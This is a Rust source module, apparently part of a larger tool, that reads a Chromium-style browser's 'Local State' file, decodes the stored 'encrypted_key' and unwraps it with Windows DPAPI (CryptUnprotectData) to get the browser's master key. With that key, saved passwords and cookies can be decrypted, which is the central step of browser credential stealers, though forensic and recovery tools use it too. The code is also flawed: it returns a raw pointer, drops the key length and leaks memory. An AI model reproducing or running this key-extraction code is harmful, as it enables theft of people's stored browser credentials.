use crate::dpapi::ptr::null_mut;

use winapi::um::dpapi::CryptUnprotectData;
use winapi::um::wincrypt::DATA_BLOB;
use std::io::{self, Error};
use base64::engine::general_purpose::STANDARD;
use base64::Engine;
use std::path::PathBuf;
use std::fs::{self, File};
use std::ptr;

pub fn decrypt_key(encrypted_key: &[u8]) -> *mut u8 {
    let mut data_in = DATA_BLOB {
        cbData: encrypted_key.len() as u32,
        pbData: encrypted_key.as_ptr() as *mut u8,
    };

    let mut data_out: DATA_BLOB = DATA_BLOB {
        cbData: 0,
        pbData: null_mut(),
    };

    let result = unsafe {
        CryptUnprotectData(
            &mut data_in,
            null_mut(),
            null_mut(),
            null_mut(),
            null_mut(),
            0,
            &mut data_out 
        )
    };

    if result != 0 {
        if !data_out.pbData.is_null() {
            return data_out.pbData;
        }
    }

    null_mut()
}

pub fn get_key(path: PathBuf) -> Result<*mut u8, io::Error> {
    let state_path = path.as_path().display().to_string();
    let local_state_path = format!(r"{state_path}\Local State");

    if fs::metadata(&local_state_path).is_ok() {
        match File::open(local_state_path) {
            Ok(file) => {
                let json: serde_json::Value = serde_json::from_reader(file).expect("File does not have proper JSON");

                if let Some(os_crypt) = json.get("os_crypt") {
                    if let Some(encrypted_key) = os_crypt.get("encrypted_key") {
                        if let Some(encrypted_key_str) = encrypted_key.as_str() {
                            let base_decrypted_key = match STANDARD.decode(encrypted_key_str) {
                                Ok(key) => key,
                                Err(e) => {
                                    return Err(Error::new(io::ErrorKind::InvalidData, e));
                                }
                            };

                            if base_decrypted_key.starts_with(b"DPAPI") {
                                let decrypted_key = decrypt_key(&base_decrypted_key["DPAPI".len()..]);                                
                                return Ok(decrypted_key);
                            } else {
                                return Err(io::Error::new(
                                    io::ErrorKind::InvalidData,
                                    "Key format is invalid",
                                ));
                            }
                        }
                    }
                }
            },
            Err(e) => {
                return Err(io::Error::new(io::ErrorKind::NotFound, e));
            }
        }
    }

    Err(io::Error::new(io::ErrorKind::NotFound, "Local State file not found"))
}